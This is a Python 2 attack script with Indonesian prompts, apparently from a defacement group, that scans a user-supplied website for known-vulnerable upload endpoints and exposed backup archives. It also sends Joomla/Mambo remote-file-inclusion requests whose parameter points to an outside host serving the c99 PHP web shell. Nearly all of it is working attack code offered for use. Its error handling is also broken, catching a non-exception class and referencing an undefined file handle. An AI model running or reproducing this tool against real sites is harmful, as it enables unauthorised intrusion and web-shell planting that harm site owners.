print "\n\n                                                    "
print "\t _   _       _     _          ______                  "
print "\t| \ | |     | |   | |         | ___ \                 "
print "\t|  \| |_   _| |__ | |__  _   _| |_/ /_   _  __ _      "
print "\t| . ` | | | | '_ \| '_ \| | | | ___ \ | | |/ _` |     "
print "\t| |\  | |_| | |_) | |_) | |_| | |_/ / |_| | (_| |     "
print "\t\_| \_/\__,_|_.__/|_.__/ \__, \____/ \__,_|\__, |     "
print "\t                          __/ |             __/ |     "
print "\tVersion 1.2              |___/             |___/  \n\n"
print "[i]  Tools   : Scanner Bug                 "
print "[i]  Author  : R3B99T - Cyber Merah Putih  "
print "[i]  Version : 1.2         \n              "

import httplib
import urllib2
import sys
import socket
import os

try:

    uploadify = ['wp-content/themes/qualifire/scripts/admin/uploadify/uploadify.php', 'wp-content/themes/pronto/cjl/pronto/uploadify/check.php', 'wp-content/plugins/1-flash-gallery/upload.php', 'wp-content/themes/zcool-like/uploadify.php', 'third-party/uploadify/uploadify.php', 'lib/uploadify/custom.php', 'wp-content/plugins/html5avmanager/lib/uploadify/custom.php', 'wp-content/plugins/wp-property/third-party/uploadify/uploadify.php', 'wp-content/plugins/squace-mobile-publishing-plugin-for-wordpress/uploadify.php', 'wp-content/plugins/1-flash-gallery/js/uploadify/uploadify.php', 'wp-content/themes/aim-theme/lib/js/old/uploadify.php', 'wp-content/plugins/annonces/includes/lib/uploadify/uploadify.php', 'wp-content/plugins/apptivo-business-site/inc/jobs/files/uploadify/uploadify.php', 'wp-content/plugins/bulletproof-security/admin/uploadify/uploadify.php', 'wp-content/plugins/chillybin-competition/js/uploadify/uploadify.php', 'wp-content/plugins/comments_plugin/uploadify/uploadify.php', 'wp-content/plugins/wp-crm/third-party/uploadify/uploadify.php', 'wp-content/plugins/doptg/libraries/php/uploadify.php', 'wp-content/plugins/pods/js/uploadify.php', 'wp-content/plugins/wp-property/third-party/uploadify/uploadify.php', 'wp-content/plugins/qr-color-code-generator-basic/QR-Color-Code-Generator/uploadify', 'uploadify.php', 'wp-content/plugins/wp-symposium/uploadify/uploadify.php', 'wp-content/plugins/uploader/uploadify.php', 'wp-content/plugins/uploadify/includes/process_upload.php', 'wp-content/plugins/very-simple-post-images/uploadify/uploadify.php']
    
    joomla = ['components/com_joomlaboard/file_upload.php?sbp=http://www.c99php.com/shell/c99.txt?', 'components/com_joomlaboard/image_upload.php?sbp=http://www.c99php.com/shell/c99.txt?', 'administrator/components/com_admin/admin.admin.html.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_simpleboard/file_upload.php?sbp=http://www.c99php.com/shell/c99.txt?', 'components/com_hashcash/server.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_sitemap/sitemap.xml.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_forum/download.php?phpbb_root_path=http://www.c99php.com/shell/c99.txt?', 'components/com_pccookbook/pccookbook.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_extcalendar/extcalendar.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/minibb/index.php?absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_smf/smf.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'modules/mod_calendar.php?absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_pollxt/conf.pollxt.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_loudmounth/includes/abbc/abbc.class.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_videodb/core/videodb.class.xml.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_pcchess/include.pcchess.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'administrator/components/com_multibanners/extadminmenus.class.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'administrator/components/com_a6mambohelpdesk/admin.a6mambohelpdesk.php?mosConfig_live_site=http://www.c99php.com/shell/c99.txt?', 'administrator/components/com_colophon/admin.colophon.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'administrator/components/com_mgm/help.mgm.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_mambatstaff/mambatstaff.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_securityimages/configinsert.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_securityimages/lang.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_galleria/galleria.html.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_zoom/classes/iptc/EXIF.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_zoom/classes/iptc/EXIF_Makernote.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'administrator/components/com_serverstat/install.serverstat.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_zoom/includes/database.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_extcalendar/extcalendar.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?']

    data = ['new.zip','admin.zip', 'admin(1).zip', 'login.zip', 'administrator(1).zip', 'administrator.zip', 'backup.zip', 'data.zip', 'web.zip', 'home.zip', 'bulan.zip', 'tahun.zip', '2010.zip', '2011.zip', '2012.zip', '2013.zip', '2014.zip', '2015.zip', '2016.zip', '2017.zip', '2018.zip', '2019.zip', '2020.zip', 'january.zip', 'february.zip', 'march.zip', 'april.zip', 'may.zip', 'june.zip', 'july.zip', 'august.zip', 'september.zip', 'october.zip', 'december.zip']

    sexy = ['components/com_sexycontactform/fileupload/index.php' , 'wp-content/plugins/sexy-contact-form/includes/fileupload/index.php']

    jfu = ['assets/global/plugins/jquery-file-upload/server/php/index.php']

    comuser = ['index.php?option=com_users&view=registration']

    tinymce = ['tinymce/plugins/image/upload.php' , 'js/tinymce/plugins/image/upload.php' , 'wp-includes/js/tinymce/plugins/image/upload.php' , 'controlpage/maps/awesome_map/js/tinymce/plugins/image/upload.php' , 'assets/backend/global/plugins/tinymce/plugins/image/upload.php' , 'vendor/tinymce/plugins/image/upload.php' , 'admin/tinymce/plugins/image/upload.php' , 'src/vendor/tinymce/plugins/image/upload.php' , 'files/tinymce/plugins/image/upload.php']

    other = ['wp-content/themes/qualifire/scripts/admin/uploadify/uploadify.php', 'wp-content/themes/pronto/cjl/pronto/uploadify/check.php', 'wp-content/plugins/1-flash-gallery/upload.php', 'wp-content/themes/zcool-like/uploadify.php', 'third-party/uploadify/uploadify.php', 'lib/uploadify/custom.php', 'wp-content/plugins/html5avmanager/lib/uploadify/custom.php', 'wp-content/plugins/wp-property/third-party/uploadify/uploadify.php', 'wp-content/plugins/squace-mobile-publishing-plugin-for-wordpress/uploadify.php', 'wp-content/plugins/1-flash-gallery/js/uploadify/uploadify.php', 'wp-content/themes/aim-theme/lib/js/old/uploadify.php', 'wp-content/plugins/annonces/includes/lib/uploadify/uploadify.php', 'wp-content/plugins/apptivo-business-site/inc/jobs/files/uploadify/uploadify.php', 'wp-content/plugins/bulletproof-security/admin/uploadify/uploadify.php', 'wp-content/plugins/chillybin-competition/js/uploadify/uploadify.php', 'wp-content/plugins/comments_plugin/uploadify/uploadify.php', 'wp-content/plugins/wp-crm/third-party/uploadify/uploadify.php', 'wp-content/plugins/doptg/libraries/php/uploadify.php', 'wp-content/plugins/pods/js/uploadify.php', 'wp-content/plugins/wp-property/third-party/uploadify/uploadify.php', 'wp-content/plugins/qr-color-code-generator-basic/QR-Color-Code-Generator/uploadify', 'uploadify.php', 'wp-content/plugins/wp-symposium/uploadify/uploadify.php', 'wp-content/plugins/uploader/uploadify.php', 'wp-content/plugins/uploadify/includes/process_upload.php', 'wp-content/plugins/very-simple-post-images/uploadify/uploadify.php', 'components/com_joomlaboard/file_upload.php?sbp=http://www.c99php.com/shell/c99.txt?', 'components/com_joomlaboard/image_upload.php?sbp=http://www.c99php.com/shell/c99.txt?', 'administrator/components/com_admin/admin.admin.html.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_simpleboard/file_upload.php?sbp=http://www.c99php.com/shell/c99.txt?', 'components/com_hashcash/server.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_sitemap/sitemap.xml.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_forum/download.php?phpbb_root_path=http://www.c99php.com/shell/c99.txt?', 'components/com_pccookbook/pccookbook.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_extcalendar/extcalendar.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/minibb/index.php?absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_smf/smf.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'modules/mod_calendar.php?absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_pollxt/conf.pollxt.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_loudmounth/includes/abbc/abbc.class.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_videodb/core/videodb.class.xml.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_pcchess/include.pcchess.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'administrator/components/com_multibanners/extadminmenus.class.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'administrator/components/com_a6mambohelpdesk/admin.a6mambohelpdesk.php?mosConfig_live_site=http://www.c99php.com/shell/c99.txt?', 'administrator/components/com_colophon/admin.colophon.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'administrator/components/com_mgm/help.mgm.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_mambatstaff/mambatstaff.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_securityimages/configinsert.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_securityimages/lang.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_galleria/galleria.html.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_zoom/classes/iptc/EXIF.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_zoom/classes/iptc/EXIF_Makernote.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'administrator/components/com_serverstat/install.serverstat.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_zoom/includes/database.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'components/com_extcalendar/extcalendar.php?mosConfig_absolute_path=http://www.c99php.com/shell/c99.txt?', 'new.zip','admin.zip', 'admin(1).zip', 'login.zip', 'administrator(1).zip', 'administrator.zip', 'backup.zip', 'data.zip', 'web.zip', 'home.zip', 'bulan.zip', 'tahun.zip', '2010.zip', '2011.zip', '2012.zip', '2013.zip', '2014.zip', '2015.zip', '2016.zip', '2017.zip', '2018.zip', '2019.zip', '2020.zip', 'january.zip', 'february.zip', 'march.zip', 'april.zip', 'may.zip', 'june.zip', 'july.zip', 'august.zip', 'september.zip', 'october.zip', 'december.zip' , 'components/com_sexycontactform/fileupload/index.php' , 'wp-content/plugins/sexy-contact-form/includes/fileupload/index.php' , 'assets/global/plugins/jquery-file-upload/server/php/index.php' , 'index.php?option=com_users&view=registration' , 'tinymce/plugins/image/upload.php' , 'js/tinymce/plugins/image/upload.php' , 'wp-includes/js/tinymce/plugins/image/upload.php' , 'controlpage/maps/awesome_map/js/tinymce/plugins/image/upload.php' , 'assets/backend/global/plugins/tinymce/plugins/image/upload.php' , 'vendor/tinymce/plugins/image/upload.php' , 'admin/tinymce/plugins/image/upload.php' , 'src/vendor/tinymce/plugins/image/upload.php' , 'files/tinymce/plugins/image/upload.php']

    found=0
    
    try:
        url = raw_input("[!]  Paste your site -->>  ")
        print ""
        url=url.replace("http://","").replace("/","")
        print "[!]  Pilih Exploit yang akan kamu gunakan [!]"
        print "[!]  1. Uploadify                         [!]"
        print "[!]  2. Jommla!                           [!]"
        print "[!]  3. BackupZip                         [!]"
        print "[!]  4. sexy contact form fileupload      [!]"
        print "[!]  5. Jquery File Upload                [!]"
        print "[!]  6. Com User                          [!]"
        print "[!]  7. Tiny File Upload                  [!]"
        print "[!]  99. Auto Scan                        [!]\n"

        option=raw_input("[!]  Pilih exploit yang digunakan -->> ")         
       
        if option=='1' or option.lower()=='uploadify':
            for urn in uploadify:
                urn = "/" + urn
                uri = url+urn
                print ("\t >> Scan " + uri)
                link = httplib.HTTPConnection(url)
                link.request("GET",urn)
                reply = link.getresponse()
                if reply.status != 200:
                    found=found
                    
                else:
                    found=found+1
                    print "\t >> Scan", uri, "***DITEMUKAN*** \n" 
                    print "[!] Exploit ditemukan -->> ", uri, "\n"
                    raw_input("Press enter to continue scanning\n")
            print("Scan telah selesai \n")
            print "[!]  Eksploit Ditemukan -->>",found ," [!]"

        if option=='2' or option.lower()=='joomla':
            for urn in joomla:
                urn = "/" + urn
                uri = url+urn
                print ("\t >> Scan " + uri)
                link = httplib.HTTPConnection(url)
                link.request("GET",urn)
                reply = link.getresponse()
                if reply.status != 200:
                    found=found
                    
                else:
                    found=found+1
                    print "\t >> Scan", uri, "***DITEMUKAN*** \n" 
                    print "[!] Exploit ditemukan -->> ", uri, "\n"
                    raw_input("Press enter to continue scanning\n")
            print("Scan telah selesai \n")
            print "[!]  Eksploit Ditemukan -->>",found ," [!]"

        if option=='3' or option.lower()=='data':
            for urn in data:
                urn = "/" + urn
                uri = url+urn
                print ("\t >> Scan " + uri)
                link = httplib.HTTPConnection(url)
                link.request("GET",urn)
                reply = link.getresponse()
                if reply.status != 200:
                    found=found
                    
                else:
                    found=found+1
                    print "\t >> Scan", uri, "***DITEMUKAN*** \n" 
                    print "[!] Exploit ditemukan -->> ", uri, "\n"
                    raw_input("Press enter to continue scanning\n")
            print("Scan telah selesai \n")
            print "[!]  Eksploit Ditemukan -->>",found ," [!]"

        if option=='4' or option.lower()=='sexy':
            for urn in sexy:
                urn = "/" + urn
                uri = url+urn
                print ("\t >> Scan " + uri)
                link = httplib.HTTPConnection(url)
                link.request("GET",urn)
                reply = link.getresponse()
                if reply.status != 200:
                    found=found
                    
                else:
                    found=found+1
                    print "\t >> Scan", uri, "***DITEMUKAN*** \n" 
                    print "[!] Exploit ditemukan -->> ", uri, "\n"
                    raw_input("Press enter to continue scanning\n")
            print("Scan telah selesai \n")
            print "[!]  Eksploit Ditemukan -->>",found ," [!]"

        if option=='5' or option.lower()=='jfu':
            for urn in jfu:
                urn = "/" + urn
                uri = url+urn
                print ("\t >> Scan " + uri)
                link = httplib.HTTPConnection(url)
                link.request("GET",urn)
                reply = link.getresponse()
                if reply.status != 200:
                    found=found
                    
                else:
                    found=found+1
                    print "\t >> Scan", uri, "***DITEMUKAN*** \n" 
                    print "[!] Exploit ditemukan -->> ", uri, "\n"
                    raw_input("Press enter to continue scanning\n")
            print("Scan telah selesai \n")
            print "[!]  Eksploit Ditemukan -->>",found ," [!]"

        if option=='6' or option.lower()=='comuser':
            for urn in comuser:
                urn = "/" + urn
                uri = url+urn
                print ("\t >> Scan " + uri)
                link = httplib.HTTPConnection(url)
                link.request("GET",urn)
                reply = link.getresponse()
                if reply.status != 200:
                    found=found
                    
                else:
                    found=found+1
                    print "\t >> Scan", uri, "***DITEMUKAN*** \n" 
                    print "[!] Exploit ditemukan -->> ", uri, "\n"
                    raw_input("Press enter to continue scanning\n")
            print("Scan telah selesai \n")
            print "[!]  Eksploit Ditemukan -->>",found ," [!]"

        if option=='7' or option.lower()=='tinymce':
            for urn in tinymce:
                urn = "/" + urn
                uri = url+urn
                print ("\t >> Scan " + uri)
                link = httplib.HTTPConnection(url)
                link.request("GET",urn)
                reply = link.getresponse()
                if reply.status != 200:
                    found=found
                    
                else:
                    found=found+1
                    print "\t >> Scan", uri, "***DITEMUKAN*** \n" 
                    print "[!] Exploit ditemukan -->> ", uri, "\n"
                    raw_input("Press enter to continue scanning\n")
            print("Scan telah selesai \n")
            print "[!]  Eksploit Ditemukan -->>",found ," [!]"            

        if option=='99' or option.lower()=='other':
            for urn in other:
                urn = "/" + urn
                uri = url+urn
                print ("\t >> Scan " + uri)
                link = httplib.HTTPConnection(url)
                link.request("GET",urn)
                reply = link.getresponse()
                if reply.status != 200:
                    found=found
                    
                else:
                    found=found+1
                    print "\t >> Scan", uri, "***DITEMUKAN*** \n" 
                    print "[!] Exploit ditemukan -->> ", uri, "\n"
                    raw_input("Press enter to continue scanning\n")
            print("Scan telah selesai \n")
            print "[!]  Eksploit Ditemukan -->>",found ," [!]"

    except (httplib.HTTPResponse, socket.error) as Exit:
        print("[i]  Gunakan Url yang benar ex. www.test.com / Cek koneksi anda [i]")
        mf.close()
        os.remove(url+'.txt')
        exit()
        
except (httplib.HTTPResponse, socket.error) as Exit:
    print ""
    mf.close()
    exit()
